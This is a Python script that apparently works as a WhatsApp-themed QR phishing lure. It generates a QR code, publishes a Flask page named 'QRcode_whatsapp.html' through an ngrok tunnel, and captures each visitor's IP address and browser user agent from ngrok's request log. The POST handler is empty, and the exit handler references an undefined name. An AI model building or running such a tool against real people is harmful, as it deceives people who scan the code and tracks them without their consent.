import threading
import pyqrcode
from pyqrcode import QRCode
import png
from datetime import datetime
import os
from pyngrok import ngrok
import requests
import logging
from flask import Flask, render_template, request 
from  ngrok_token import ngrok_auth_token


b = """\033[1;92m
 ▄▄▄▄▄▄▄  ▄ ▄▄ ▄▄▄▄▄▄▄
 █ ▄▄▄ █ ██ ▀▄ █ ▄▄▄ █
 █ ███ █ ▄▀ ▀▄ █ ███ █
 █▄▄▄▄▄█ █ ▄▀█ █▄▄▄▄▄█
 ▄▄ ▄  ▄▄▀██▀▀ ▄▄▄ ▄▄
 ▄██ ▀ ▄ █▄▀ ▄ ▄█▀▀  ▄  
 █▀█▄▄█▄ ▀▀▄▀▄▄▀ ▀▀▄ █    
 ▄▄▄▄▄▄▄ █ ▄▀  ▄█▄▄██       
 █ ▄▄▄ █  ▄▄█▀█▄ ▀ ▄▄
 █ ███ █ ▀▀█▀▄  ██ ▀▀█
 █▄▄▄▄▄█ █▀ ▄▄▀▀ █▄ ▄

"""

try:
	print(b)
	def cod():
		code = input('\033[1;33mselect QR :\033[1;37m ')
		QR = pyqrcode.create(code)
		QR.png("QRcode.png",scale=6)
		os.system("rm static/QRcode.png")
		os.system("mv QRcode.png static")
	def ngr0k():
		cod()
		ask = input("\033[1;92mdo you chinge token ngrok :\033[1;37m")
		if ask == "y" or ask == "yes":
			ngrok_auth_token = input("\033[1;92mtoken :\033[1;37m ")
			os.system("rm ngrok_token.py")
			file1 = open('ngrok_token.py', 'a')
			file1.write("ngrok_auth_token = "+"'"+str(ngrok_auth_token)+"'")
			file1.close()

		else:
			print("\033[1;33myour token:")


	log = logging.getLogger('werkzeug')
	log.setLevel(logging.ERROR)

	os.environ["FLASK_ENV"] = "development"
	app = Flask(__name__)
	app.debug = False
	fport = 5000

	PORT = int(os.environ.get('PORT', 5000))

	ngr0k()
	from  ngrok_token import ngrok_auth_token
	ngrok.set_auth_token(ngrok_auth_token)
	public_url = ngrok.connect(fport).public_url
	final_ngrok = public_url[:4] + "s" + public_url[4:]
	print(f" * \033[1;33mngrok tunnel link \033[1;37m->   {final_ngrok}\033[1;92m")
	app.config["BASE_URL"] = public_url
	@app.route("/",methods=['POST','GET'])
	def home():

		if request.method == 'GET':
			now = str(datetime.now())
			req = requests.get('http://localhost:4040/api/requests/http').json()
			user_agent = req['requests'][0]['request']['headers']['User-Agent'][0]        
			ip_address = req['requests'][0]['request']['headers']['X-Forwarded-For'][0]

#			cod()
			
			log_msg = "\033[1;37mTime: "+ str(now) +"      "+"\033[1;92mIP_ADDRESS: "+ str(ip_address) +"       "+"\033[1;33mUSER-AGENT: "+ str(user_agent)
#			print(log_msg)
			
		elif request.method == 'POST':
			now = str(datetime.now())


		return render_template("QRcode_whatsapp.html")
		
	threading.Thread(target=app.run, kwargs={"use_reloader": False}).start()
except KeyboardInterrupt:
    print(f"{bcolors.FAIL} Ending task.....\n")
